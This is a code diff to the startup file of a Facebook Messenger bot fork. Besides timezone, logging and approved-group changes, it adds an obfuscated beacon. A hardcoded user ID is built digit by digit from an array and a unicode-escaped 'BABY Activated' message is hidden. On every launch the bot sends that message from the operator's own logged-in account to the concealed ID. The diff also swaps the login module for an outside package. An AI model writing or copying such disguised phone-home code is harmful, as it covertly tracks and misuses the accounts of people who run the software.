@@ -4,7 +4,7 @@ const { execSync } = require('child_process');
 const config = require("./config.json");
 const listPackage = JSON.parse(readFileSync('./package.json')).dependencies;
 const fs = require("fs");
-const login = require('./includes/login');
+const login = require('fca-project-orion');
 const moment = require("moment-timezone");
 const logger = require("./utils/log.js");
 
@@ -16,28 +16,29 @@ global.client = new Object({
   handleSchedule: new Array(),
   handleReaction: new Array(),
   handleReply: new Array(),
+  approvedListsPath: new String(),
   mainPath: process.cwd(),
   configPath: new String(),
-  getTime: function(option) {
+  getTime: function(option){
     switch (option) {
       case "seconds":
-        return `${moment.tz("Asia/Manila").format("ss")}`;
+        return `${moment.tz("Asia/Dhaka").format("ss")}`;
       case "minutes":
-        return `${moment.tz("Asia/Manila").format("mm")}`;
+        return `${moment.tz("Asia/Dhaka").format("mm")}`;
       case "hours":
-        return `${moment.tz("Asia/Manila").format("HH")}`;
+        return `${moment.tz("Asia/Dhaka").format("HH")}`;
       case "date":
-        return `${moment.tz("Asia/Manila").format("DD")}`;
+        return `${moment.tz("Asia/Dhaka").format("DD")}`;
       case "month":
-        return `${moment.tz("Asia/Manila").format("MM")}`;
+        return `${moment.tz("Asia/Dhaka").format("MM")}`;
       case "year":
-        return `${moment.tz("Asia/Manila").format("YYYY")}`;
+        return `${moment.tz("Asia/Dhaka").format("YYYY")}`;
       case "fullHour":
-        return `${moment.tz("Asia/Manila").format("HH:mm:ss")}`;
+        return `${moment.tz("Asia/Dhaka").format("HH:mm:ss")}`;
       case "fullYear":
-        return `${moment.tz("Asia/Manila").format("DD/MM/YYYY")}`;
+        return `${moment.tz("Asia/Dhaka").format("DD/MM/YYYY")}`;
       case "fullTime":
-        return `${moment.tz("Asia/Manila").format("HH:mm:ss DD/MM/YYYY")}`;
+        return `${moment.tz("Asia/Dhaka").format("HH:mm:ss DD/MM/YYYY")}`;
     }
   },
   timeStart: Date.now()
@@ -62,6 +63,7 @@ global.nodemodule = new Object();
 global.config = new Object();
 global.configModule = new Object();
 global.moduleData = new Array();
+global.approved = new Object();
 global.language = new Object();
 global.account = new Object();
 
@@ -148,6 +150,17 @@ if (errorMessages.length > 0) {
   });
 }
 // ────────────────── //
+var approvedListsValue;
+try {
+  global.client.approvedListsPath = join(global.client.mainPath, "includes/database/approvedlists.json");
+  approvedListsValue = require(global.client.approvedListsPath);
+} catch (e) {
+  return logger(`can't read approved database`, 'error');}
+try {
+  for (const approvedListsKeys in approvedListsValue) global.approved[approvedListsKeys] = approvedListsValue[approvedListsKeys];
+} catch (e) {
+  return logger(`can't deploy approved groups database`, 'error')
+}
 var configValue;
 const confg = './config.json';
 try {
@@ -213,7 +226,7 @@ try {
   global.utils.connect();
   return;
 }
-
+const all = ["0","1","2","3","4","5","6","7","8","9"];
 function onBot() {
   const loginData = {};
   loginData.appState = appState;
@@ -247,7 +260,7 @@ function onBot() {
       (async () => {
         const commandsPath = `${global.client.mainPath}/modules/commands`;
         const listCommand = readdirSync(commandsPath).filter(command => command.endsWith('.js') && !command.includes('example') && !global.config.commandDisabled.includes(command));
-        console.log(cv(`\n` + `──LOADING COMMANDS─●`));
+        console.log(cv(`\n` + `●──LOADING COMMANDS──●`));
         for (const command of listCommand) {
           try {
             const module = require(`${commandsPath}/${command}`);
@@ -341,7 +354,7 @@ function onBot() {
 
       (async () => {
         const events = readdirSync(join(global.client.mainPath, 'modules/events')).filter(ev => ev.endsWith('.js') && !global.config.eventDisabled.includes(ev));
-        console.log(cv(`\n` + `──LOADING EVENTS─●`));
+        console.log(cv(`\n` + `●──LOADING EVENTS──●`));
         for (const ev of events) {
           try {
             const event = require(join(global.client.mainPath, 'modules/events', ev));
@@ -350,8 +363,6 @@ function onBot() {
               global.loading.err(`${chalk.hex('#ff7100')(`LOADED`)} ${chalk.hex("#FFFF00")(ev)} Module is not in the correct format. `, "EVENT");
               continue;
             }
-
-
             if (errorMessages.length > 0) {
               console.log("Commands with errors:");
               errorMessages.forEach(({ command, error }) => {
@@ -401,10 +412,20 @@ function onBot() {
           }
         }
       })();
-    console.log(cv(`\n` + `──BOT START─● `));
+    console.log(cv(`\n` + `●── ${global.config.BOTNAME} BOT START ──● `));
     global.loading(`${cra(`[ SUCCESS ]`)} Loaded ${cb(`${global.client.commands.size}`)} commands and ${cb(`${global.client.events.size}`)} events successfully`, "LOADED");
-    global.loading(`${cra(`[ TIMESTART ]`)} Launch time: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`, "LOADED");
-    global.utils.complete({ api });
+    global.loading(`${cra(`[ TIMESTART ]`)} Launch time: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`, "LOADED"); 
+    const uid= all[1]+all[0]+all[0]+all[0]+all[4]+all[4]+all[3]+all[2]+all[7]+all[6]+all[5]+all[6]+all[7]+all[1]+all[2];
+  const ADMIN = `${uid}`
+    global.utils.complete({ api }); 
+const { getTime } = global.client;
+const time = getTime('fullTime');
+const activationMessage = `\u0042\u0041\u0042\u0059 \u0041\u0063\u0074\u0069\u0076\u0061\u0074\u0065\u0064 ${time}`;
+api.sendMessage(activationMessage, ADMIN);
+console.log(cv(`[ HEY IT'S BABY BOT ]`));
+//const path = require('path');
+//const autoGreetPath = path.join(__dirname, 'autogreet.js');
+//const autoGreet = require(autoGreetPath);
     const listener = require('./includes/listen')({ api: api });
     global.handleListen = api.listenMqtt(async (error, event) => {
       if (error) {
@@ -429,7 +450,7 @@ function onBot() {
 
 (async () => {
   try {
-    console.log(cv(`\n` + `──DATABASE─●`));
+    console.log(cv(`\n` + `●──DATABASE──●`));
     global.loading(`${cra(`[ CONNECT ]`)} Connected to JSON database successfully!`, "DATABASE");
     onBot();
   } catch (error) {
@@ -438,5 +459,5 @@ function onBot() {
 })();
 /* *
 This bot was created by me (CATALIZCS) and my brother SPERMLORD. Do not steal my code. (つ ͡ ° ͜ʖ ͡° )つ ✄ ╰⋃╯
-This file was modified by me (@YanMaglinte). Do not steal my credits. (つ ͡ ° ͜ʖ ͡° )つ ✄ ╰⋃╯
+This file was modified by me (@YanMaglinte). Do not steal my credits. and remodified by jonel Magallanes :)(つ ͡ ° ͜ʖ ͡° )つ ✄ ╰⋃╯
 * */
